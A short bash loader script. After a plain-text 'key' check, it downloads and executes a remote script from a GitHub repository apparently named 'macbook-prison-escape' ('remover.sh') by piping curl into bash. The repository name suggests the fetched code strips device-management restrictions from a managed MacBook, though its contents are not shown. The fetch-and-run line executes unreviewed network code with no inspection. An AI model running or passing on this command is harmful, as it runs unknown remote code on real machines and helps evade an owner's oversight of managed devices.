#!/bin/bash


echo "Enter the key to access the script:"
read key


if [ "$key" == "234567, 123456" ]; then

/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/forveined/macbook-prison-escape/main/remover.sh)"

else

  echo "Incorrect key. Access denied."
  fi
exit 1
